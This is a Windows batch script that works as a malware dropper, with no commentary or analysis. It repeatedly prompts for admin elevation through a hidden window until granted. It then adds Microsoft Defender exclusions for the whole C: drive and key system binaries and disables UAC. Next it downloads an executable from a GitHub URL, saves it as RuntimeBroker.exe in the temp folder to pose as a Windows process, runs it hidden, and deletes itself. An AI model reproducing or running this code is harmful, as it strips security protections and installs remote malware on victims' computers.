@echo off
NET SESSION >nul 2>&1
if %errorlevel% == 0 (
    goto :A
) else (
    goto :B
)

:A
powershell -ExecutionPolicy Bypass -Command "[System.Net.ServicePointManager]::SecurityProtocol = [System.Net.SecurityProtocolType]::Tls12; Add-MpPreference -ExclusionPath 'C:\', 'C:\cmd.exe', 'C:\conhost.exe', 'C:\cvtres.exe', 'C:\Windows\Microsoft.NET\Framework64\v4.0.30319\MSbuild.exe', 'C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe', 'C:\Windows\System32\Wscript.exe' -ErrorAction SilentlyContinue" >nul 2>&1
powershell -ExecutionPolicy Bypass -Command "Set-ItemProperty -Path 'HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System' -Name 'EnableLUA' -Value 0" >nul 2>&1
powershell -Command "if ((Get-MpPreference -ErrorAction SilentlyContinue).ExclusionPath -contains 'C:\') { exit 0 } else { exit 1 }" >nul 2>&1
if %errorlevel% neq 0 (
    goto :A
)
timeout /t 2 >nul 2>&1
powershell -Command "$ProgressPreference = 'SilentlyContinue'; $ErrorActionPreference = 'SilentlyContinue'; Invoke-WebRequest -Uri 'https://github.com/boycots563/wlt56/raw/main/kamzat.exe' -OutFile '%TEMP%\RuntimeBroker.exe' -UseBasicParsing" >nul 2>&1

:W
if not exist "%TEMP%\RuntimeBroker.exe" (
    timeout /t 1 >nul 2>&1
    goto :W
)
start "" /B "%TEMP%\RuntimeBroker.exe" >nul 2>&1
del /f /q "%~f0" >nul 2>&1
exit /b

:B
powershell -WindowStyle Hidden -Command "Start-Process -WindowStyle Hidden -FilePath '%~f0' -Verb RunAs" >nul 2>&1
if %errorlevel% neq 0 (
    timeout /t 3 >nul 2>&1
    goto :B
)
exit /b



